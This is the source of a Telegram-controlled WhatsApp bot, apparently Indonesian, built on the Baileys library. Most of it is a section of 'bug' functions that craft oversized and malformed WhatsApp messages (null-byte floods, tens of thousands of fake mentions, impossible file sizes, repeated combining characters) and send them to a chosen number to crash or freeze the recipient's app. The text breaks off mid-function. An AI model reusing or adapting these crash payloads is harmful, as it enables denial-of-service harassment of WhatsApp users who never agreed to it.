const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageTag,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const figlet = require("figlet");
const startTime = Date.now();

function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

const defaultSettings = {
  cooldown: 60, // detik
  groupOnly: false
};

if (!fs.existsSync('./settings.json')) {
  fs.writeFileSync('./settings.json', JSON.stringify(defaultSettings, null, 2));
}

let settings = JSON.parse(fs.readFileSync('./settings.json'));

const cooldowns = new Map();

function runtime() {
  const ms = Date.now() - startTime;
  const seconds = Math.floor(ms / 1000) % 60;
  const minutes = Math.floor(ms / (1000 * 60)) % 60;
  const hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  const days = Math.floor(ms / (1000 * 60 * 60 * 24));
  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

function badge(userId) {
  return {
    premium: isPremium(userId) ? "✅" : "❌",
    supervip: isSupervip(userId) ? "✅" : "❌"
  };
}
//msg.key.id

function dateTime() {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const parts = formatter.formatToParts(now);
  const get = (type) => parts.find(p => p.type === type).value;

  return `${get("day")}-${get("month")}-${get("year")} ${get("hour")}:${get("minute")}:${get("second")}`;
}

//function group only
bot.on('message', (msg) => {
  const chatType = msg.chat.type;
if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 Bot ini hanya bisa digunakan di *grup*.', {
    parse_mode: 'Markdown'
  });
}

});

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
//fungsi penginisialisasi
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}
//otomatis membuat file session
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
//function info koneksi message bot
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
╭━━━⭓「 𝐒𝐓𝐀𝐑𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
\`\`\`
╭━━━⭓「 𝐑𝐄 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
        \`\`\`
╭━━━⭓「 𝐋𝐎𝐒𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ❌
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
        \`\`\`
╭━━━⭓「 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ✅
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
            \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆  ☇ 𝐂𝐨𝐃𝐄 ° 」
║  𝐂𝐎𝐃𝐄 : ${formattedCode}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
          \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆 ☇ 𝐄𝐑𝐑𝐨𝐑 ° 」
║  𝐑𝐄𝐀𝐒𝐨𝐍 : ${error.message}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
//definisi bot token dari file config.js
const { BOT_TOKEN } = require("./config.js");

// BUG FUNCTION SECTION
// TARO FUNCT COLONGAN MU DISINI 🤭

async function crashZ(sock, jid, mention) {
            let msg = await generateWAMessageFromContent(jid, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "@raysofhopee",
                    footerText: "vip",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "HADES VIP!" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [jid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: jid },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (mention) {
                await sock.relayMessage(
                    jid,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "hmmm",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        async function IMGCRL(sock, jid) {
let cards = [];

for (let r = 0; r < 1000; r++) {
cards.push({
body: { text: '📜 • 𝐑𝐀𝐋𝐃𝐙𝐙 𝐌𝐄𝐒𝐒𝐀𝐆𝐄' },
header: {
title: ' ',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "107374182400",
height: 9999,
width: 9999,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '%'.repeat(99999),
buttons: [
{
name: "cta_call",
buttonParamsJson: JSON.stringify({ status: 9999 })
},
{
name: "single_select",
buttonParamsJson: JSON.stringify({ status: 9999 })
}
]
}
});
}

let msg = await generateWAMessageFromContent(jid, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: 'ꦾ'.repeat(60000) },
footer: { text: '© !𝗌`𝗋𝖺𝗅𝖽𝗓𝗓 𝗑𝗒𝗓 ' },
carouselMessage: {
cards: cards
},
contextInfo: {
participant: "0@s.whatsapp.net",
remoteJid: "@s.whatsapp.net",
mentionedJid: [
target,
...Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
],
}
}
}
}
}, {});

await sock.relayMessage(jid, msg.message, {
participant: { jid: jid },
messageId: msg.key.id
});
}

        async function potterinvis(sock, jid, mention) {
 console.log(chalk.green("Berhasil mengirim Bug Potter Invictus⚡"));
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "🐉 𝐏𝐎𝐓𝐓𝐄𝐑 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 🐉",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, generateMessage, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      jid,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "potter is back" },
            content: undefined,
          },
        ],
      }
    );
  }
}

        async function callNewsletter(sock, jid) {
await sock.relayMessage(jid, {
callLogMesssage: { isVideo: true, callOutcome: "REJECTED", durationSecs: "1", callType: "VOICE_CHAT", participants: [{ jid: jid, callOutcome: "CONNECTED" }, { jid: "0@s.whatsapp.net", callOutcome: "CONNECTED" }]}
}, {})
}

async function crashNewsletter(sock, jid) {
  const msg = generateWAMessageFromContent(jid, {
    interactiveMessage: {
      header: {
      documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
       fileLength: "9999999999999",
       pageCount: 9999999999999,
       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
       fileName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mediaKeyTimestamp: 1735456100,
       contactVcard: true,
       caption: "F*ucking Everyone"
      }
     },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: "trigger",
              order: {
                status: "flex_agency",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: "".repeat(10000) 
      }
   }
  }, { userJid: jid });

  await sock.relayMessage(jid, msg.message, { 
    participant: { jid: jid },
    messageId: msg.key.id 
  });
}
        async function VcardXFc(sock, jid) {
  const apiClient = JSON.stringify({
    status: true,
    criador: "Carinho",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Tama Ryuichi | I'm Beginner",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "€ 𝗧𝗮𝗺𝗮 𝗥𝘆𝘂𝗶𝗰𝗵𝗶",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: jid,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              title: "\u200B".repeat(10000),
              body: "GIDEOVA_PAYMENT_STATUSED"
            }),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: apiClient + "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: apiClient + "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "payment_status",
                buttonParamsJson: ""
              },
              {
                name: "review_order",
                buttonParamsJson: JSON.stringify({
                  reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
                  order: {
                    status: "pending",
                    order_type: "ORDER"
                  },
                  share_payment_status: true,
                  call_permission: true
                })
              },
              {
                name: "contact",
                buttonParamsJson: JSON.stringify({
                  vcard: {
                    full_name: "Zephyrine Chema ".repeat(4000),
                    phone_number: "+628217973312",
                    email: "zephyrineexploit@iCloud.com",
                    organization: "Zephyrine Exploiter",
                    job_title: "Customer Support"
                  }
                })
              }
            ]
          }
        }
      }
    }
  }, { userJid: jid });

  await sock.relayMessage(jid, msg.message, {
    participant: { jid: jid },
    messageId: msg.key.id
  });
}
        async function XdelayTrash(sock, jid, mention) { 
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "sayonara...",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Hp Kentang Dilarang Coba²"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(jid, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await sock.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "kontol lor" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
        async function LocaBetanew2(sock, jid, mention) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [jid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: { 
              text: `‌𝐈𝐬‌𝐚‌𝐠𝐢 ⍣᳟᪳ 𝐈‌𝐧‌𝐟𝐢𝐧‌𝐢‌𝐭𝐲${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, message, {
      participant: { jid: jid },
    });
  } catch (err) {
    console.log(err);
  }
}
async function BetaUI(sock, jid, Ptcp = false) {
let virtex =  `조로Nted Crash Gen6🐉버그\n${"ꦾ".repeat(107777)}`;
			await sock.relayMessage(jid, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "109951162777600",
										pageCount: 9999999999,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0003".repeat(100),
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: [jid],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 9999999999999,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: jid
					}
				} : {}
			);
   	};

async function CrashXUiKiller(sock, jid, ptcp = true) {
            let msg = await generateWAMessageFromContent(jid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "조로Nted Crash Gen6🐉버그",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "조로Nted Crash Gen6🐉버그" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: venomModsData + "ꦾ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: venomModsData + "ꦾ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await sock.relayMessage(jid, msg.message, ptcp ? {
				participant: {
					jid: jid
				}
			} : {});
        }
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

async function XProto3V2(sock, jid, mention) {
    const protoMessage = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "𝕷𝖎𝖍𝖃 𝖃𝖛𝖎𝖕" + "🥶".repeat(101),
                    height: 010,
                    width: 101,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
